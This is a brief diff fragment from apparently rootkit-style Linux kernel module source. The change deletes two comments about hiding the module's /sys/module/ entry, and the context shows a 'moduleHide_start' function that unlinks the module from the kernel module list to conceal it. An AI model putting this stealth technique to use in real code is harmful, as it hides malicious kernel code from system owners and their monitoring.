@@ -13,8 +13,6 @@ static struct list_head *prev;	// The entry before our module in the kernel modu
 static bool started = false;
 
 
-// Additional things to hide:
-	// The file in the /sys/module/ folder
 int moduleHide_start(void) {
    if (started) return 0;
 	// Removes module structure from kernel module list structure, which in turn hides it from 
